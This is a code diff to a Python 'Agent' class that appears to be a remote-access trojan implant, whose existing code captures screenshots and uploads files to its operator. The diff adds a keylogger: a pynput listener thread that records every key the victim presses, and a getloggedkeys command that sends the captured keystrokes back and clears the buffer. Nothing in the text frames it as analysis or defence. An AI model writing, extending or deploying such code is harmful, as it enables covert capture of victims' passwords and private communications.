@@ -15,6 +15,7 @@ import zipfile
 import tempfile
 import socket
 import getpass
+from pynput.keyboard import Key, Listener
 
 if os.name == 'nt':
     from PIL import ImageGrab
@@ -44,6 +45,7 @@ class Agent(object):
         self.uid = self.get_UID()
         self.hostname = socket.gethostname()
         self.username = getpass.getuser()
+        self.keylogs = ""
 
     def get_install_dir(self):
         install_dir = None
@@ -286,6 +288,20 @@ class Agent(object):
             os.system("screencapture %s" % name)
             print(name)
         self.upload(screenshot_file)
+
+    @threaded
+    def startkeylogger(self):
+        "Starts logging every key pressed"
+        def on_press(key):
+            self.keylogs += str(key) + " "
+
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+
+    @threaded
+    def getloggedkeys(self):
+        self.send_output(str(self.keylogs))
+        self.keylogs = ""
 
     def help(self):
         """ Displays the help """
